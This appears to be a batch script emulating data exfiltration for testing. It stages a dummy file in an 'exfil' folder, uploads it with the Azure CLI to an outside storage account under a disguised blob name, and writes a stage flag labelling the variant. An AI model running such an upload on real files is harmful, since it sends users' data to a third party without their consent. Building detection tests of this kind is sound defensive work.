@echo off
set EXFIL_DIR=%USERPROFILE%\bops4048\exfil
if not exist "%EXFIL_DIR%" mkdir "%EXFIL_DIR%"
if not exist "%EXFIL_DIR%\part3.dat" echo dummy > "%EXFIL_DIR%\part3.dat"
call az storage blob upload --account-name nebuchadnezzar --container-name oracle --file "%EXFIL_DIR%\part3.dat" --name "tank-3576633342.bin"
ver >nul
> "%EXFIL_DIR%\stage-03.flag" (
  echo variant=03-direct-az-cli-piece-3
  echo carrier=tank-3576633342.bin
  echo writer=az.cmd
  echo timestamp=%DATE% %TIME%
)
exit /b 0
